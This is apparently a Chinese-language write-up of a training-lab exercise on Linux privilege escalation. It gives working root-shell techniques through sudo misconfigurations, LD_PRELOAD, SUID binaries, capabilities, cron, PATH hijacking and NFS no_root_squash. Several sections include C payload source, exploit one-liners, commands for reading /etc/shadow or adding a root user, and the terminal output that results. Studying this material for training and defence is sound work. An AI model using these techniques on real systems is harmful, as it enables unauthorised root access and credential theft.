sudo 命令默认允许你以 root 权限运行程序。在某些情况下，系统管理员需要为普通用户提供一定的权限灵活性。例如，初级安全运营中心分析师可能需要经常使用 Nmap，但无权获得完整的 root 访问权限。此时，系统管理员可以仅允许该用户以 root 权限运行 Nmap，而在系统其他操作中保持其普通权限级别。

任何用户都可以使用 sudo -l 命令查看自身当前与 root 权限相关的配置情况。

https://gtfobins.github.io/ 这是一个专门整理 Unix/Linux 系统内置命令如何被滥用来绕过限制或提权的“黑魔法”速查手册。

比如如果某个普通用户被配置为允许执行sudo nmap，就可以利用`sudo nmap --interactive`获取一个root权限的shell。

#### 利用应用程序功能

在此场景下，部分应用程序暂无已知漏洞可利用，Apache2 服务器就是典型例子。

这种情况下，我们可以借助应用程序自身的某项功能，采用一种非常规手段来窃取信息。比如 Apache2 提供了加载备用配置文件的参数选项（-f：指定备用服务器配置文件）。

使用该选项加载 /etc/shadow 文件会触发报错信息，报错内容中会包含 /etc/shadow 文件的首行内容。

#### 利用LD_PRELOAD机制

1. 核心概念：什么是 LD_PRELOAD？

LD_PRELOAD 是 Linux 系统中的一个环境变量，它允许程序在启动时优先加载指定的共享库（.so 文件）。这意味着攻击者可以编写自定义函数来“劫持”或替换系统标准的库函数，从而在程序运行前执行恶意代码。

2. 利用的前提条件

要成功利用此漏洞，必须满足以下条件：

Sudo 配置漏洞：通过 sudo -l 查看时，发现 env_keep 选项中包含 LD_PRELOAD。这意味着当你使用 sudo 执行命令时，系统会保留并信任你设置的该环境变量。

用户权限：当前用户至少拥有以 sudo 运行某个程序的权限（例如 find、vim 等）。

![](/assets/images/20260512/sudo.png)

3. 攻击步骤详解

整个提权过程分为四步：

第一步：检查环境

执行 sudo -l。如果在输出的 Matching Defaults 中看到 env_keep += LD_PRELOAD，说明系统存在此配置风险。

第二步：编写恶意 C 代码

编写一个简单的 C 程序（如 shell.c），利用 _init() 函数（该函数会在库加载时立即执行）。代码核心功能是设置用户 ID 为 0（Root）并启动 /bin/bash。

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```

第三步：编译为共享对象

使用 gcc 将代码编译成共享库文件（.so）：gcc -fPIC -shared -o shell.so shell.c -nostartfiles。

第四步：触发提权

行任意你有 sudo 权限的程序，并在启动时手动指定 LD_PRELOAD 指向你的恶意库：sudo LD_PRELOAD=/home/user/ldpreload/shell.so <任意sudo程序>。

![](/assets/images/20260512/ld-preload.png)

### suid

SUID（设置用户标识）和 SGID（设置组标识）是 Linux 中特殊的权限位，它们允许用户以文件所有者或属组的身份执行某个程序，而不是以当前登录用户的身份。在多用户系统中，这通常用于让普通用户安全地执行某些需要高权限的任务（比如修改自己的密码）。

这里的/usr/bin/passwd就是设置了suid，如果是`-rwsr-sr-x`则也设置了sgid。

```
$ ls -l /usr/bin/passwd
-rwsr-xr-x 1 root root 68208 May 28  2020 /usr/bin/passwd
```

因为/etc/shadow只有root才能写，所以普通用户执行passwd命令需要以root身份执行。

`find / -type f -perm -04000 -ls 2>/dev/null`命令可以找到所有设置了suid或sgid的文件。

一个良好的实践是，将此列表中的可执行文件与 [GTFOBins](https://gtfobins.github.io) 进行比对。点击 SUID 按钮即可筛选出已知在设置 SUID 位时可被利用的二进制程序（你也可以通过此链接直接获取预筛选列表：https://gtfobins.github.io/#+suid）。

```
karen@ip-10-49-149-159:/$ find / -type f -perm -04000 -ls 2>/dev/null | grep base64
    1722     44 -rwsr-xr-x   1 root     root               43352 Sep  5  2019 /usr/bin/base64
karen@ip-10-49-149-159:/$ cat /home/ubuntu/flag3.txt
cat: /home/ubuntu/flag3.txt: Permission denied
karen@ip-10-49-149-159:/$ base64 /home/ubuntu/flag3.txt | base64 -d
THM-3847834
```

假设nano命令被设置了suid，但GTFOBins并未提供直接可用的利用方法。在此阶段，我们有两种权限提升的基础方式：读取 /etc/shadow 文件，或将当前用户添加至 /etc/passwd 文件中。以下是利用两种攻击途径的简易操作步骤：

- 读取 /etc/shadow 文件
    - 执行 find /-type f -perm -04000 -ls 2>/dev/null 命令，可以查看到 nano 文本编辑器已设置 SUID 权限位。
    - 执行 nano /etc/shadow 命令即可查看 /etc/shadow 文件的内容。此时可借助 unshadow 工具生成能够被John the Ripper破解的文件。要完成该操作，unshadow 需要同时读取 /etc/shadow 和 /etc/passwd 两个文件（`unshadow passwd.txt shadow.txt > passwords.txt`）。
- 另一种方法是添加一个拥有 root 权限的新用户
    - 我们需要获取为新用户设置的密码的哈希值，在 Kali Linux 系统中使用 openssl 工具即可快速生成（`openssl passwd -1 -salt THM password1`）
    - 随后我们将把该密码与用户名一同添加到 /etc/passwd 文件中（使用nano编辑完成等效操作`echo hacker:<passwd>:0:0:root:/root:/bin/bash >> /etc/password`）

### Capabilities

Capabilities能够以更细的粒度对权限进行管控。

例如，安全运营中心分析师需要使用一款需要发起套接字连接的工具，普通用户默认无法执行该操作。如果系统管理员不想为该用户授予更高的系统权限，就可以修改对应二进制文件的能力配置。配置完成后，该二进制程序无需高权限用户身份，即可正常完成自身任务。

我们可以使用 getcap 工具查看已启用的能力权限。

```
karen@ip-10-49-188-239:~$ getcap -r / 2>/dev/null
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/ping = cap_net_raw+ep
/home/karen/vim = cap_setuid+ep
/home/ubuntu/view = cap_setuid+ep
```

比如这里的ping，需要收发icmp，正是因为有了net_raw能力，才能让普通用户在无suid/sgid的情况下执行ping命令。

https://gtfobins.org/#//^capabilities$ 上可以找到利用capabilities的提权方式。

通过vim的setuid能力，可以获取到一个root权限的shell：

```
./vim -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
```

### cron jobs

原理十分简单：如果存在一项以 root 权限执行的计划任务，且我们能够修改该任务将要运行的脚本，那么我们植入的脚本就会以 root 权限执行。

系统中的每个用户都拥有专属的计划任务文件，无论用户是否处于登录状态，都可以执行设定好的特定任务。可想而知，我们的目标就是找到由 root 用户设置的定时任务，利用它来运行我们的脚本，最好是交互式 Shell 脚本。

任何用户都可以读取存放系统级定时任务的 /etc/crontab 文件。夺旗赛靶机中的定时任务可能每分钟或每五分钟执行一次，而在渗透测试实战中，你更常见到按日、周、月周期运行的任务。

```
karen@ip-10-48-168-59:~$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
* * * * *  root /antivirus.sh
* * * * *  root antivirus.sh
* * * * *  root /home/karen/backup.sh
* * * * *  root /tmp/test.py
```

如果没有指定脚本的完整路径，定时任务会按照 /etc/crontab 文件中 PATH 环境变量所列出的路径进行查找。

### PATH

如果PATH中存在当前用户拥有写入权限的文件夹，就有可能劫持应用程序来执行恶意脚本。Linux 中的 PATH 是一个环境变量，用于告知操作系统可执行文件的查找位置。对于非 Shell 内置、也未通过绝对路径指定的任意命令，Linux 会从 PATH 所定义的文件夹中依次进行查找。（此处大写 PATH 指环境变量，小写 path 指文件所在路径）。

```
# 找到所有可写的目录，仅提取一层
karen@ip-10-48-189-238:/$ find / -writable 2>/dev/null | cut -d "/" -f 2 | sort -u
dev
etc
home
proc
run
snap
sys
tmp
usr
var
# 对比PATH
karen@ip-10-48-189-238:/$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
# 继续找/usr下可写目录
karen@ip-10-48-189-238:/$ find /usr -writable 2>/dev/null | cut -d "/" -f 2,3 | sort -u
usr/lib
# 继续找/snap下可写目录
karen@ip-10-48-189-238:/$ find /snap -writable 2>/dev/null | cut -d "/" -f 2,3 | sort -u
snap/core
snap/core18
snap/core20

# 没有可利用的path，找有suid的可执行文件
karen@ip-10-48-189-238:/$ find / -type f -perm -04000 -ls 2>/dev/null | grep /home/murdoch/test
   256346     20 -rwsr-xr-x   1 root     root               16712 Jun 20  2021 /home/murdoch/test
# 尝试执行发现在执行thm文件
karen@ip-10-48-189-238:/$ /home/murdoch/test
sh: 1: thm: not found

# 修改当前用户PATH
export PATH=$PATH:/home/murdoch
# PATH劫持
echo "cat /home/matt/flag6.txt" > /home/murdoch/thm
chmod +x /home/murdoch/thm
```

### NFS

这个是NFS的配置文件，目标机器有三个共享目录：

```
karen@ip-10-49-164-182:/$ cat /etc/exports
# /etc/exports: the access control list for filesystems which may be exported
#               to NFS clients.  See exports(5).
#
# Example for NFSv2 and NFSv3:
# /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)
#
# Example for NFSv4:
# /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
# /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)
#
/home/backup *(rw,sync,insecure,no_root_squash,no_subtree_check)
/tmp *(rw,sync,insecure,no_root_squash,no_subtree_check)
/home/ubuntu/sharedfolder *(rw,sync,insecure,no_root_squash,no_subtree_check)
```

`no_root_squash`表示，远程主机的 root 用户在挂载该目录后，在该目录内依然拥有真正的 root 权限。

攻击机上查询目标机器已导出的目录：

```
root@ip-10-49-64-126:~# showmount -e 10.49.164.182
Export list for 10.49.164.182:
/home/ubuntu/sharedfolder *
/tmp                      *
/home/backup              *
```

将目录挂载到本地：

```
root@ip-10-49-64-126:~# mkdir /mnt/target
root@ip-10-49-64-126:~# mount -o rw 10.49.164.182:/tmp /mnt/target
```

写一个带suid的shell程序：

```
root@ip-10-49-64-126:/mnt/target# pwd
/mnt/target
root@ip-10-49-64-126:/mnt/target# cat nfs.c
int main() {
        setgid(0);
        setuid(0);
        system("/bin/bash");
        return 0;
}
root@ip-10-49-64-126:/mnt/target# gcc nfs.c -o nfs -w
root@ip-10-49-64-126:/mnt/target# chmod +s nfs
root@ip-10-49-64-126:/mnt/target# ls -l nfs
-rwsr-sr-x 1 root root 16784 May 14 07:10 nfs
root@ip-10-49-64-126:/mnt/target#

# 到目标机器上，执行即可获得root shell
karen@ip-10-49-164-182:/tmp$ ./nfs
root@ip-10-49-164-182:/tmp# cat /home/matt/flag7.txt
THM-89384012
root@ip-10-49-164-182:/tmp#
```